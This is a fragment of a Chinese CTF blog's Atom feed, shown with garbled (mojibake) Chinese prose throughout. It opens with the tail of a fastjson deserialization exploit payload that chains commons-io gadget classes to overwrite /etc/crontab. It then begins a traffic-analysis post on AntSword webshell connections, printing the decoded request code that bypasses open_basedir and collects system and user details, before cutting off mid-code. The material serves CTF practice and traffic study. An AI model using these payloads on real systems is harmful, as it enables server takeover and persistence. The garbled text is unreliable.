aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"charsetName"</span><span class="token operator">:</span><span class="token string">"UTF-8"</span><span class="token punctuation">,</span>      <span class="token property">"bufferSize"</span><span class="token operator">:</span><span class="token number">1024</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"branch"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.output.WriterOutputStream"</span><span class="token punctuation">,</span>      <span class="token property">"writer"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.output.FileWriterWithEncoding"</span><span class="token punctuation">,</span>        <span class="token property">"file"</span><span class="token operator">:</span><span class="token string">"/etc/crontab"</span><span class="token punctuation">,</span>        <span class="token property">"encoding"</span><span class="token operator">:</span><span class="token string">"UTF-8"</span><span class="token punctuation">,</span>        <span class="token property">"append"</span><span class="token operator">:</span> <span class="token boolean">false</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"charset"</span><span class="token operator">:</span><span class="token string">"UTF-8"</span><span class="token punctuation">,</span>      <span class="token property">"bufferSize"</span><span class="token operator">:</span> <span class="token number">1024</span><span class="token punctuation">,</span>      <span class="token property">"writeImmediately"</span><span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"trigger"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.XmlStreamReader"</span><span class="token punctuation">,</span>      <span class="token property">"is"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.TeeInputStream"</span><span class="token punctuation">,</span>        <span class="token property">"input"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>          <span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.input"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"branch"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>          <span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.branch"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"closeBranch"</span><span class="token operator">:</span> <span class="token boolean">true</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"httpContentType"</span><span class="token operator">:</span><span class="token string">"text/xml"</span><span class="token punctuation">,</span>      <span class="token property">"lenient"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token property">"defaultEncoding"</span><span class="token operator">:</span><span class="token string">"UTF-8"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"trigger2"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.XmlStreamReader"</span><span class="token punctuation">,</span>      <span class="token property">"is"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.TeeInputStream"</span><span class="token punctuation">,</span>        <span class="token property">"input"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>          <span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.input"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"branch"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>          <span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.branch"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"closeBranch"</span><span class="token operator">:</span> <span class="token boolean">true</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"httpContentType"</span><span class="token operator">:</span><span class="token string">"text/xml"</span><span class="token punctuation">,</span>      <span class="token property">"lenient"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token property">"defaultEncoding"</span><span class="token operator">:</span><span class="token string">"UTF-8"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"trigger3"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.XmlStreamReader"</span><span class="token punctuation">,</span>      <span class="token property">"is"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.TeeInputStream"</span><span class="token punctuation">,</span>        <span class="token property">"input"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>          <span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.input"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"branch"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>          <span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.branch"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"closeBranch"</span><span class="token operator">:</span> <span class="token boolean">true</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"httpContentType"</span><span class="token operator">:</span><span class="token string">"text/xml"</span><span class="token punctuation">,</span>      <span class="token property">"lenient"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token property">"defaultEncoding"</span><span class="token operator">:</span><span class="token string">"UTF-8"</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¯”èµ›ç»“æŸä¹‹åé¶æœºå¥½åƒå°±æ‰“ä¸äº†è¿™ä¸ªäº†</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æ—  pwn æ‰‹ä½œæˆ˜ï¼Œé—æ†¾ç¬¬ä¹&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/CCsdqEK_HOlE4eXj7QDEnQ&quot;&gt;https://mp.weixin.qq.com/s/CCsdqEK_HOlE4eXj7QDEnQ&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/chuangfeimeiyigeren/eeii37/pyuic5kgzp3xe3tg&quot;&gt;https://www.yuque.com/chuangfeimeiyigeren/eeii37/pyuic5kgzp3xe3tg&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>åŠ å¯†æµé‡åˆ†æ</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2025-11-28T09:26:32.000Z</published>
    <updated>2025-12-09T17:21:17.275Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://www.freebuf.com/articles/web/264896.html">https://www.freebuf.com/articles/web/264896.html</a></p><p><a href="https://forum.butian.net/index.php/share/1996">https://forum.butian.net/index.php/share/1996</a></p><span id="more"></span><hr><h1 id="èšå‰‘æµé‡"><a href="#èšå‰‘æµé‡" class="headerlink" title="èšå‰‘æµé‡"></a>èšå‰‘æµé‡</h1><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>php ä¸€å¥è¯ webshellï¼Œpost å‚æ•°ä¸º 0</p><p>è®¾ç½®èšå‰‘ä»£ç†åˆ° yakit ä¸ŠæŠ“åŒ…åˆ†æ</p><p>èšå‰‘é…ç½®ç¼–è§£ç å™¨</p><p><img src="/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/IMG-20251201110851050.png"></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="default-æµé‡"><a href="#default-æµé‡" class="headerlink" title="default æµé‡"></a>default æµé‡</h3><p>æŠ“å–æµ‹è¯•è¿æ¥çš„æ•°æ®åŒ…ï¼š</p><p><img src="/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/IMG-20251201111008478.png"></p><p>è§£ç è¯·æ±‚ä½“å¹¶æ ¼å¼åŒ–ï¼Œåˆ†æ </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// å…³é—­é”™è¯¯æ˜¾ç¤ºï¼Œé¿å…æš´éœ²ä¿¡æ¯</span>@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è®¾ç½®è„šæœ¬æ‰§è¡Œæ—¶é—´æ— é™åˆ¶</span>@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è·å–PHPçš„open_basediré™åˆ¶</span><span class="token variable">$opdir</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$opdir</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$ocwd</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è§£ç base64å­—ç¬¦ä¸²";|:/"ï¼Œç”¨äºåˆ†å‰²open_basedirè·¯å¾„</span>    <span class="token variable">$oparr</span> <span class="token operator">=</span> <span class="token function">preg_split</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Lzt8Oi8="</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$opdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// å°†å½“å‰ç›®å½•å’Œä¸´æ—¶ç›®å½•æ·»åŠ åˆ°æ•°ç»„ä¸­</span>    @<span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$oparr</span><span class="token punctuation">,</span> <span class="token variable">$ocwd</span><span class="token punctuation">,</span> <span class="token function">sys_get_temp_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// éå†æ‰€æœ‰ç›®å½•ï¼Œå°è¯•ç»•è¿‡open_basediré™åˆ¶</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$oparr</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">is_writable</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">// åˆ›å»ºä¸´æ—¶ç›®å½•ç”¨äºæµ‹è¯•</span>        <span class="token variable">$tmdir</span> <span class="token operator">=</span> <span class="token variable">$item</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/.e937733bd891"</span><span class="token punctuation">;</span>        @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$tmdir</span> <span class="token operator">=</span> <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// è®¾ç½®open_basedirä¸ºä¸Šçº§ç›®å½•ï¼Œå°è¯•ç»•è¿‡é™åˆ¶</span>        @<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$cntarr</span> <span class="token operator">=</span> @<span class="token function">preg_split</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\//"</span><span class="token punctuation">,</span> <span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// é€šè¿‡å¤šæ¬¡chdir("..")å›åˆ°æ ¹ç›®å½•</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$cntarr</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">// æˆåŠŸç»•è¿‡åè®¾ç½®open_basedirä¸ºæ ¹ç›®å½•</span>        @<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        @<span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// åŠ å¯†å‡½æ•°ï¼ˆdefaultä¸ºç©ºï¼‰</span><span class="token keyword">function</span> <span class="token function-definition function">asenc</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// è¾“å‡ºå‡½æ•°ï¼Œç”¨äºå°è£…è¿”å›æ•°æ®</span><span class="token keyword">function</span> <span class="token function-definition function">asoutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è¾“å‡ºå¼€å§‹æ ‡è®°</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ee69b"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"ffbe3"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> @<span class="token function">asenc</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è¾“å‡ºç»“æŸæ ‡è®°</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"d7a1"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"8240"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// å¼€å§‹è¾“å‡ºç¼“å†²</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$D</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$D</span> <span class="token operator">==</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token variable">$D</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"PATH_TRANSLATED"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$R</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$D</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>  <span class="token comment">// å½“å‰ç›®å½•</span>        <span class="token comment">// æ£€æµ‹ç³»ç»Ÿç±»å‹å’Œç£ç›˜</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Windowsç³»ç»Ÿï¼šæ£€æµ‹Cåˆ°Zç›˜</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"C"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Z"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$L</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$L</span><span class="token punctuation">&#125;</span></span>:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$R</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$L</span><span class="token punctuation">&#125;</span></span>:"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Linux/Unixç³»ç»Ÿï¼šæ ¹ç›®å½•</span>        <span class="token variable">$R</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$R</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>  <span class="token comment">// åˆ¶è¡¨ç¬¦åˆ†éš”</span>        <span class="token comment">// è·å–å½“å‰ç”¨æˆ·ä¿¡æ¯</span>    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"posix_getegid"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> @<span class="token function">posix_getpwuid</span><span class="token punctuation">(</span>@<span class="token function">posix_geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$u</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> @<span class="token function">get_current_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// è·å–æ“ä½œç³»ç»Ÿä¿¡æ¯</span>    <span class="token variable">$R</span> <span class="token operator">.=</span> <span class="token function">php_uname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$R</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$s</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>  <span class="token comment">// ç”¨æˆ·å</span>        <span class="token keyword">echo</span> <span class="token variable">$R</span><span class="token 